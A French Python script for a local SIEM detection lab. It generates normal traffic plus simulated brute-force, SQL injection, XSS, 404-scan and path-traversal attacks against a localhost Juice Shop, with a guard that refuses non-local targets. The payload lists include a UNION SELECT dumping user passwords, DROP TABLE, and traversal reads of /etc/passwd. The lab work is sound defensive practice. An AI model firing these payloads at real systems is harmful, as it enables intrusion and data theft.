"""Générateur de trafic pour le laboratoire Mini-SIEM.

Envoie du trafic NORMAL puis des ATTAQUES SIMULÉES vers le labo local,
pour que access.log contienne des traces à détecter.

SÉCURITÉ : le script refuse toute cible autre que localhost (exigence F9).
Attaquer un site sans autorisation écrite est illégal.

Utilisation :
    python app/attack_sim.py                      # tout : normal + 5 attaques
    python app/attack_sim.py --scenario sqli      # un seul scénario
    python app/attack_sim.py --cible http://exemple.com   # -> refusé
"""
import argparse
import random
import secrets
import sys
import time
from urllib.parse import urlparse

import requests

# 127.0.0.1 plutôt que "localhost" : sous Windows, "localhost" essaie d'abord
# l'IPv6 (::1), où Docker n'écoute pas -> environ 2 s perdues par requête.
CIBLE_PAR_DEFAUT = "http://127.0.0.1:8080"
HOTES_AUTORISES = {"localhost", "127.0.0.1", "::1"}

# Fausses IP prises dans les plages réservées à la documentation (RFC 5737).
# Elles sont envoyées dans l'en-tête X-Forwarded-For, que nginx utilise comme IP du client.
IP_VISITEURS = [f"192.0.2.{n}" for n in range(10, 25)]   # 15 visiteurs normaux
IP_BRUTE_FORCE = "203.0.113.66"
IP_SQLI = "203.0.113.77"
IP_XSS = "203.0.113.88"
IP_SCAN = "198.51.100.99"
IP_TRAVERSAL = "198.51.100.111"

NAVIGATEURS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/130.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_5) Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64; rv:132.0) Gecko/20100101 Firefox/132.0",
]


# ---------------------------------------------------------------------------
#  Garde-fou : on ne vise QUE localhost
# ---------------------------------------------------------------------------
def verifier_cible(url):
    """Arrête le programme si la cible n'est pas sur ma propre machine."""
    hote = urlparse(url).hostname
    if hote not in HOTES_AUTORISES:
        print(f"REFUSÉ : la cible '{hote}' n'est pas localhost.")
        print("Ce script ne doit attaquer que le laboratoire local.")
        sys.exit(1)


def envoyer(methode, url, ip, **options):
    """Envoie une requête en se faisant passer pour l'IP `ip`.

    Renvoie le code HTTP (ou 0 si le serveur ne répond pas).
    """
    entetes = options.pop("headers", {})
    entetes["X-Forwarded-For"] = ip
    try:
        reponse = requests.request(methode, url, headers=entetes, timeout=10, **options)
        return reponse.status_code
    except requests.RequestException as erreur:
        print(f"  ! erreur réseau : {erreur}")
        return 0


# ---------------------------------------------------------------------------
#  Trafic normal
# ---------------------------------------------------------------------------
def creer_compte_test(cible):
    """Crée un compte Juice Shop jetable, avec un mot de passe aléatoire.

    Ainsi aucun mot de passe n'est écrit dans le code.
    """
    email = f"visiteur_{secrets.token_hex(4)}@labo.local"
    mot_de_passe = secrets.token_urlsafe(12)
    donnees = {"email": email, "password": mot_de_passe, "passwordRepeat": mot_de_passe}
    envoyer("POST", f"{cible}/api/Users", IP_VISITEURS[0], json=donnees)
    return email, mot_de_passe


def trafic_normal(cible, nb_requetes=200):
    print(f"[normal] {nb_requetes} requêtes de visiteurs normaux")
    email, mot_de_passe = creer_compte_test(cible)
    recherches = ["apple", "banana", "juice", "lemon", "orange", "melon", "l'orange"]
    # "l'orange" contient une apostrophe : recherche normale qui risque
    # d'être prise pour une injection SQL (faux positif à étudier pour R2).

    for _ in range(nb_requetes):
        ip = random.choice(IP_VISITEURS)
        agent = {"User-Agent": random.choice(NAVIGATEURS)}
        action = random.choice(["accueil", "recherche", "produit", "recherche", "connexion"])

        if action == "accueil":
            envoyer("GET", f"{cible}/", ip, headers=agent)
        elif action == "recherche":
            mot = random.choice(recherches)
            envoyer("GET", f"{cible}/rest/products/search", ip, headers=agent, params={"q": mot})
        elif action == "produit":
            envoyer("GET", f"{cible}/api/Products/{random.randint(1, 30)}", ip, headers=agent)
        else:
            # Connexion réussie (statut 200) ; parfois l'utilisateur se trompe
            # une fois avant (un 401 isolé ne doit PAS déclencher R1).
            if random.random() < 0.3:
                envoyer("POST", f"{cible}/rest/user/login", ip, headers=agent,
                        json={"email": email, "password": "mauvais"})
            envoyer("POST", f"{cible}/rest/user/login", ip, headers=agent,
                    json={"email": email, "password": mot_de_passe})

        time.sleep(random.uniform(0.01, 0.05))


# ---------------------------------------------------------------------------
#  Les 5 scénarios d'attaque (un par règle R1 à R5)
# ---------------------------------------------------------------------------
def brute_force(cible):
    """R1 : 20 tentatives de connexion échouées en moins d'une minute -> 401."""
    print("[R1 brute force] 20 connexions échouées")
    for i in range(20):
        envoyer("POST", f"{cible}/rest/user/login", IP_BRUTE_FORCE,
                json={"email": "admin@labo.local", "password": f"essai{i}"})


def injection_sql(cible):
    """R2 : recherches contenant des motifs d'injection SQL."""
    print("[R2 injection SQL] recherches piégées")
    charges = [
        "' OR 1=1--",
        "apple' OR '1'='1",
        "')) UNION SELECT id, email, password FROM Users--",
        "test'; DROP TABLE Users--",
    ]
    for charge in charges:
        envoyer("GET", f"{cible}/rest/products/search", IP_SQLI, params={"q": charge})


def xss(cible):
    """R3 : recherches contenant des balises HTML / du JavaScript."""
    print("[R3 XSS] recherches avec des scripts")
    charges = [
        "<script>alert(1)</script>",
        '<iframe src="javascript:alert(1)">',
        "<img src=x onerror=alert(1)>",
    ]
    for charge in charges:
        envoyer("GET", f"{cible}/rest/products/search", IP_XSS, params={"q": charge})


def scan_pages(cible):
    """R4 : 100 requêtes vers des pages qui n'existent pas."""
    print("[R4 scan] 100 pages inexistantes")
    noms = ["admin", "backup", "config", "secret", "passwords", "old", "test",
            "db", "dump", "private", "users", "logs", "keys", "notes", "todo",
            "draft", "prod", "dev", "export", "archive"]
    pages = []
    for nom in noms:
        pages.append(f"/ftp/{nom}.md")        # Juice Shop répond 404
        pages.append(f"/ftp/{nom}.pdf")       # 404
        pages.append(f"/{nom}.php")           # 200 ! (Juice Shop renvoie l'accueil)
    pages += [f"/api/Products/{n}" for n in range(1000, 1040)]   # produits inexistants -> 404

    for page in pages[:100]:
        envoyer("GET", f"{cible}{page}", IP_SCAN)


def traversal(cible):
    """R5 : tentatives de remonter dans les dossiers du serveur (../)."""
    print("[R5 traversal] remontée de dossiers")
    # requests "nettoie" les ../ en clair et réécrit %2e en ".", on envoie donc
    # des formes encodées (%2f = "/") ou doublement encodées (%252e = "%2e").
    chemins = [
        "/ftp/..%2fpackage.json",                    # remonte de /ftp vers la racine
        "/assets/public/..%2f..%2fpackage.json",
        "/ftp/%252e%252e%252fpackage.json",          # double encodage
        "/ftp/....//....//etc/passwd",               # variante pour contourner un filtre
        # Celle-ci sort de la racine du site : nginx la bloque tout seul (400)
        # avant de lire les en-têtes -> elle apparaîtra avec l'IP de Docker.
        "/ftp/..%2f..%2f..%2fetc%2fpasswd",
    ]
    for chemin in chemins:
        envoyer("GET", f"{cible}{chemin}", IP_TRAVERSAL)


SCENARIOS = {
    "normal": trafic_normal,
    "brute_force": brute_force,
    "sqli": injection_sql,
    "xss": xss,
    "scan": scan_pages,
    "traversal": traversal,
}


def main():
    parser = argparse.ArgumentParser(description="Trafic de test pour le labo Mini-SIEM")
    parser.add_argument("--cible", default=CIBLE_PAR_DEFAUT, help="URL du labo (localhost seulement)")
    parser.add_argument("--scenario", default="tout", choices=["tout", *SCENARIOS])
    args = parser.parse_args()

    verifier_cible(args.cible)          # le garde-fou passe AVANT toute requête
    cible = args.cible.rstrip("/")

    if args.scenario == "tout":
        for fonction in SCENARIOS.values():
            fonction(cible)
    else:
        SCENARIOS[args.scenario](cible)
    print("Terminé. Les traces sont dans logs/access.log")


if __name__ == "__main__":
    main()
